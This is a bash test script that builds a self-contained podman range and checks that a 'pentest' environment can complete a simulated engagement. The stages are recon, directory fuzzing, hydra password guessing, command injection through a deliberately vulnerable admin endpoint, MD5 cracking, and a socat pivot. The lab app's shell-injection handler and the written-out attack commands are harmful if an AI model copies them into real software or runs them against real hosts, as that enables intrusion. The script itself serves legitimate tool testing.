#!/usr/bin/env bash
# M5's first exit criterion, as far as a script can carry it: a full engagement run on
# spawn, start to finish, with no Exegol anywhere.
#
# What this does and does not claim. It cannot assert "you ran a real engagement" --
# that is the user's judgement about their own work. What it CAN assert is that the
# workflow an engagement is made of actually functions on spawn: recon finds the
# target, enumeration finds the way in, a credential attack recovers a password, the
# access works, loot comes back, a hash cracks, and a pivot reaches a host the attacker
# cannot touch directly. If any of those is broken, "every tool runs" was never the
# interesting claim.
#
# The whole lab is built by this script and lives in three containers on one podman
# network. Nothing outside it is touched: the attacker env's egress policy denies
# everything except the one host it is pointed at, which is also what makes the pivot
# stage a real proof rather than a demonstration of two reachable hosts.
#
#   rangeweb   the foothold:  a web app with a leak, weak credentials and an injection
#   rangeint   internal only: holds the flag, unreachable from the attacker directly
#   attacker   profiles = ["pentest"], egress denied except rangeweb
#
# Usage: test/engagement.sh      (needs spawn on PATH, podman, and a nix store)
set -u
R=${SPAWN_TEST_DIR:-$HOME/.cache/spawn-engagement}
rm -rf "$R"; mkdir -p "$R"; cd "$R"

# Everything also goes to a log. An engagement takes minutes, and a run whose progress
# is only visible after it finishes is no help when a stage hangs -- which is how the
# nmap problem below was found.
exec > >(tee "$R/run.log") 2>&1
printf 'log: %s\n' "$R/run.log"

fail=0
stage() { printf '\n== %s\n' "$1"; }
ok()    { printf '  [PASS] %s\n' "$1"; }
bad()   { printf '  [FAIL] %s\n' "$1"; fail=1; }
note()  { printf '  ..... %s\n' "$1"; }

NET=spawnrange
# The password the engagement is supposed to discover, and the flag it is supposed to
# reach. Written here, never given to the attacker env.
PASS='Autumn2026!'
FLAG='SPAWN{internal-host-reached-through-the-pivot}'

cleanup() {
  for e in attacker rangeweb rangeint; do spawn rm --purge "$e" >/dev/null 2>&1; done
}
[ "${SPAWN_KEEP:-}" = 1 ] || trap cleanup EXIT
cleanup

# --- the lab ----------------------------------------------------------------------
# The foothold is a web service, not sshd, and that is a deliberate retreat.
#
# sshd was the first choice -- a recovered password used over ssh is the most honest
# version of this stage. It does not work in a rootless env without more plumbing than
# this test should carry: sshd will not start without its privilege-separation user,
# and once that is declared it still refuses the password while reporting nothing the
# client can see. The hash itself verifies (regenerating it with the stored salt
# reproduces it byte for byte), so the fault is in sshd's non-PAM auth path inside a
# container, not in the credential.
#
# What matters for M5 is whether the WORKFLOW functions: a credential attack that
# recovers a secret, and that secret then yielding command execution. Basic auth is a
# first-class hydra module and a command-injection endpoint is a real finding, so both
# stages keep their meaning and stop depending on sshd's privsep. If ssh in an env is
# wanted later, it is a feature with its own tests, not a prerequisite for this one.
cat > rangeweb.toml <<EOF
schema = 1
name = "rangeweb"
tools = ["python3", "socat", "coreutils", "gnugrep", "bashInteractive"]

[network]
join = "$NET"

# The lab service. Declared as a file so it is part of the manifest rather than
# something a hook writes -- re-applied on every up, and visible to anyone reading it.
[files]
"/srv/app.py" = { content = '''
import base64, http.server, subprocess, urllib.parse

PASS = "$PASS"
NOTES = "# deployment notes\\nadmin console: /admin/  user: root  password: %s\\n" % PASS

class H(http.server.BaseHTTPRequestHandler):
    def send(self, code, body, extra=()):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        for k, v in extra:
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body.encode())

    def authed(self):
        h = self.headers.get("Authorization", "")
        if not h.startswith("Basic "):
            return False
        try:
            user, _, pw = base64.b64decode(h[6:]).decode().partition(":")
        except Exception:
            return False
        return user == "root" and pw == PASS

    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if p.path == "/":
            return self.send(200, "range\\n")
        # The finding: a forgotten directory with listing enabled, readable by anyone,
        # holding a credential. The directory itself has to answer 200 or directory
        # enumeration cannot find it -- serving only the file inside made ffuf report
        # nothing while curl fetched it happily.
        if p.path in ("/backup-old", "/backup-old/"):
            return self.send(200, "notes.txt\\n")
        if p.path == "/backup-old/notes.txt":
            return self.send(200, NOTES)
        if p.path.startswith("/admin"):
            if not self.authed():
                return self.send(401, "auth required\\n",
                                 [("WWW-Authenticate", 'Basic realm="admin"')])
            # And the second finding: the console passes its argument to a shell.
            cmd = urllib.parse.parse_qs(p.query).get("cmd", [""])[0]
            if p.path == "/admin/exec" and cmd:
                out = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True)
                return self.send(200, out.stdout + out.stderr)
            return self.send(200, "admin console: /admin/exec?cmd=\\n")
        return self.send(404, "not found\\n")

    def log_message(self, *a):
        pass

http.server.HTTPServer(("0.0.0.0", 8080), H).serve_forever()
''' }
EOF

cat > rangeint.toml <<EOF
schema = 1
name = "rangeint"
tools = ["python3", "socat", "coreutils", "bashInteractive"]

[network]
join = "$NET"
EOF

stage "building the lab"
spawn up rangeweb.toml true >/dev/null 2>&1 || { echo "rangeweb did not build"; exit 1; }
spawn up rangeint.toml true  >/dev/null 2>&1 || { echo "rangeint did not build";  exit 1; }
WEBIP=$(podman inspect spawn-rangeweb -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
INTIP=$(podman inspect spawn-rangeint -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
[ -n "$WEBIP" ] && [ -n "$INTIP" ] || { echo "the lab got no addresses on $NET"; exit 1; }
note "rangeweb $WEBIP   rangeint $INTIP"

WP=$(podman inspect spawn-rangeweb -f '{{index .Config.Labels "spawn.profile"}}')
IP_=$(podman inspect spawn-rangeint -f '{{index .Config.Labels "spawn.profile"}}')

# /bin/sh does not exist in an env -- there is no base image -- and the injection
# endpoint runs its command through it. SPAWN_PROFILE is exported for exactly this.
spawn up rangeweb bash -c "
  set -e
  mkdir -p /bin /root
  [ -e /bin/sh ] || ln -s \"\$SPAWN_PROFILE/bin/bash\" /bin/sh
  printf '%s' 'cab' | md5sum | cut -d' ' -f1 > /root/loot.md5
  test -f /srv/app.py
  echo SETUP-OK
" > setup.log 2>&1
grep -q SETUP-OK setup.log || { echo "lab setup failed:"; tail -5 setup.log; exit 1; }

# Daemons need exec -d: podman exec reaps its process group, so a backgrounded
# listener dies with the exec that started it. Learned the hard way in M3.
podman exec -d spawn-rangeweb "$WP/bin/python3" /srv/app.py 2>/dev/null

spawn up rangeint bash -c "mkdir -p /srv && printf '%s\n' '$FLAG' > /srv/flag.txt" >/dev/null 2>&1
podman exec -d -w /srv spawn-rangeint "$IP_/bin/python3" -m http.server 8080 2>/dev/null

# Confirm the lab is actually up before blaming the attacker's tooling for anything.
web=""
for _ in 1 2 3 4 5 6 7 8 9 10; do
  web=$(spawn up rangeweb bash -c 'timeout 4 python3 -c "
import urllib.request
print(urllib.request.urlopen(\"http://127.0.0.1:8080/\", timeout=3).status)
" 2>/dev/null' 2>/dev/null | tr -d '\r')
  [ "$web" = 200 ] && break
  sleep 2
done
[ "$web" = 200 ] && note "the foothold is serving on rangeweb:8080" \
  || bad "lab setup: the foothold did not answer (got '$web')"

# --- the attacker -----------------------------------------------------------------
# One profile for the whole engagement, which is the claim M5 is making. Egress is
# denied except the foothold: that is what makes stage 3 a policy proof and stage 7 a
# real pivot.
cat > attacker.toml <<EOF
schema = 1
name = "attacker"
profiles = ["pentest"]
caps = ["NET_RAW"]
persist = ["/loot"]

[network]
join = "$NET"
egress = "deny"
allow = ["$WEBIP"]
EOF

stage "building the attacker env (profiles = [\"pentest\"])"
spawn up attacker.toml true >/dev/null 2>&1 || { echo "the pentest env did not build"; exit 1; }
note "$(spawn up attacker bash -c 'ls /nix/store/*-spawn-attacker/bin | wc -l' 2>/dev/null | tr -d "\r") executables on PATH"

run() { spawn up attacker bash -c "$1" 2>/dev/null | tr -d '\r'; }

# --- 1. recon ---------------------------------------------------------------------
stage "1. recon: find the target's services"
# -sT, deliberately. nmap defaults to a SYN scan when it has NET_RAW, and a SYN scan
# HANGS here: the env's egress policy drops everything but the one allowed host, and
# nmap's raw-socket path sits waiting on replies that the kernel never hands it rather
# than erroring. A connect scan uses ordinary sockets, gets refused or accepted like
# any other program, and finishes. Worth knowing before an engagement rather than
# during one -- and an argument for `--reason` whenever a scan looks stuck.
ports=$(run "nmap -sT -Pn -n --max-retries 1 --host-timeout 40s -p 22,80,443,8080,9999 --open -oG - $WEBIP | grep -o '[0-9]*/open' | cut -d/ -f1 | sort -n | tr '\n' ' '")
note "nmap: ${ports:-nothing}"
case "$ports" in
  *8080*) ok "nmap found the service" ;;
  *) bad "nmap did not find 8080 (got '$ports')" ;;
esac
# And the ports that are NOT open must not be reported, or the scan says nothing.
case "$ports" in
  *9999*) bad "nmap reported 9999, which nothing is listening on yet" ;;
  *) ok "nmap did not invent a service that is not there" ;;
esac

# --- 2. enumeration --------------------------------------------------------------
stage "2. enumeration: find the way in"
cat > words.txt <<'EOF'
admin
backup-old
images
private
uploads
EOF
cp words.txt "$HOME/.local/share/spawn/envs/attacker/rootfs/root/words.txt" 2>/dev/null
found=$(run "ffuf -u http://$WEBIP:8080/FUZZ -w /root/words.txt -mc 200,301 -s 2>/dev/null | tr -d ' '")
note "ffuf: ${found:-nothing}"
case "$found" in
  *backup-old*) ok "ffuf discovered the forgotten directory" ;;
  *) bad "ffuf did not find backup-old (got '$found')" ;;
esac

leak=$(run "curl -s --max-time 5 http://$WEBIP:8080/backup-old/notes.txt")
case "$leak" in
  *password:*) ok "the directory leaked a credential" ;;
  *) bad "no credential in the leak (got '$leak')" ;;
esac

# --- 3. the policy, before using it ----------------------------------------------
# The internal host has to be unreachable, or the pivot proves nothing. Paired with
# the audit log, so "it did not connect" cannot be a routing accident.
stage "3. confinement: the internal host is out of reach"
direct=$(run "timeout 4 curl -s --max-time 3 http://$INTIP:8080/flag.txt; echo rc=\$?")
case "$direct" in
  *"$FLAG"*) bad "the attacker reached the internal host DIRECTLY: the policy is not holding" ;;
  *) ok "no direct route to the internal host" ;;
esac
audit=$(spawn audit attacker 2>/dev/null | tr -d '\r')
case "$audit" in
  *"$INTIP"*) ok "the egress policy recorded the refusal" ;;
  *) bad "the audit log does not mention $INTIP, so the block is unexplained" ;;
esac

# --- 4. credential attack --------------------------------------------------------
stage "4. credential attack: recover the password"
{ echo Spring2026!; echo Summer2026!; echo "$PASS"; echo Winter2026!; } > pw.txt
cp pw.txt "$HOME/.local/share/spawn/envs/attacker/rootfs/root/pw.txt" 2>/dev/null
cracked=$(run "hydra -l root -P /root/pw.txt -s 8080 -t 4 -f -o /root/hydra.out $WEBIP http-get /admin/ 2>&1 | tail -4; echo ---; cat /root/hydra.out 2>/dev/null")
note "hydra: $(printf '%s' "$cracked" | tr '\n' ' ' | cut -c1-160)"
case "$cracked" in
  *"$PASS"*) ok "hydra recovered the admin password" ;;
  *) bad "hydra did not recover the password" ;;
esac
# The wordlist has to matter: a tool that reports success for anything is worse than
# no tool, so the same attack with the password removed must fail.
{ echo Spring2026!; echo Winter2026!; } > pwbad.txt
cp pwbad.txt "$HOME/.local/share/spawn/envs/attacker/rootfs/root/pwbad.txt" 2>/dev/null
nf=$(run "hydra -l root -P /root/pwbad.txt -s 8080 -t 4 -f -o /root/hydra2.out $WEBIP http-get /admin/ 2>&1 | tail -2; cat /root/hydra2.out 2>/dev/null")
case "$nf" in
  *"$PASS"*) bad "hydra reported a password that is not in the list" ;;
  *) ok "a wordlist without the password finds nothing" ;;
esac

# --- 5. access -------------------------------------------------------------------
stage "5. access: a command on the target"
# The credential first: without it the console is a 401, which is what makes the
# recovered password the thing that bought the access.
denied=$(run "curl -s -o /dev/null -w '%{http_code}' --max-time 5 'http://$WEBIP:8080/admin/'")
[ "$denied" = 401 ] && ok "the console refuses an unauthenticated caller" \
  || bad "the console answered $denied without credentials"
whoami=$(run "curl -s --max-time 6 -u 'root:$PASS' 'http://$WEBIP:8080/admin/exec?cmd=id%20-u;uname%20-n'")
note "exec: $(printf '%s' "$whoami" | tr '\n' ' ')"
case "$whoami" in
  0*) ok "command execution as uid 0 on the target" ;;
  *) bad "no command execution (got '$whoami')" ;;
esac

# --- 6. loot and crack -----------------------------------------------------------
stage "6. loot: take a hash and crack it"
hash=$(run "curl -s --max-time 6 -u 'root:$PASS' 'http://$WEBIP:8080/admin/exec?cmd=cat%20/root/loot.md5' | head -1")
note "looted hash: ${hash:-none}"
# Two places on purpose. /loot is persisted, so it outlives `spawn rm` -- but a persist
# directory is a mount, not part of the rootfs, so `spawn diff` cannot see it. The copy
# under /root is what stage 8 inspects.
run "mkdir -p /loot /root/engagement && printf '%s\n' '$hash' | tee /loot/looted.md5 > /root/engagement/looted.md5" >/dev/null
plain=$(run "hashcat -m 0 -a 3 --quiet --potfile-disable /root/engagement/looted.md5 '?l?l?l' 2>/dev/null | tail -1")
note "hashcat: ${plain:-nothing}"
case "$plain" in
  *:cab) ok "hashcat 8 cracked the looted hash on the CPU" ;;
  *) bad "the looted hash did not crack (got '$plain')" ;;
esac

# --- 7. pivot --------------------------------------------------------------------
# A relay on the foothold, reached through the one address the policy allows. The flag
# lives on a host stage 3 proved is unreachable, so arriving at it is the pivot.
stage "7. pivot: reach the internal host through the foothold"
podman exec -d spawn-rangeweb "$WP/bin/socat" \
  TCP-LISTEN:9999,fork,reuseaddr "TCP:$INTIP:8080" 2>/dev/null
sleep 2
got=$(run "curl -s --max-time 6 http://$WEBIP:9999/flag.txt")
note "through the relay: ${got:-nothing}"
case "$got" in
  *"$FLAG"*) ok "the flag came back through the pivot" ;;
  *) bad "the pivot did not reach the internal host (got '$got')" ;;
esac

# --- 8. the report ---------------------------------------------------------------
# What an engagement leaves behind should be inspectable without trusting the operator's
# memory, which is what spawn diff is for.
stage "8. report: what the engagement wrote"
d=$(spawn diff attacker 2>/dev/null | tr -d '\r')
case "$d" in
  *engagement*) ok "spawn diff shows the loot the engagement collected" ;;
  *) bad "spawn diff does not show it (got '$(printf '%s' "$d" | head -4 | tr '\n' ' ')')" ;;
esac

printf '\n'
if [ "$fail" -eq 0 ]; then
  printf 'ENGAGEMENT COMPLETE: recon, enumeration, credentials, access, loot, crack,\n'
  printf 'pivot and report, all on one spawn profile, with egress denied throughout.\n'
else
  printf 'ENGAGEMENT INCOMPLETE: see the failures above.\n'
fi
[ "${SPAWN_KEEP:-}" = 1 ] && printf '\nSPAWN_KEEP=1: the lab is still up (spawn ls).\n'
exit "$fail"
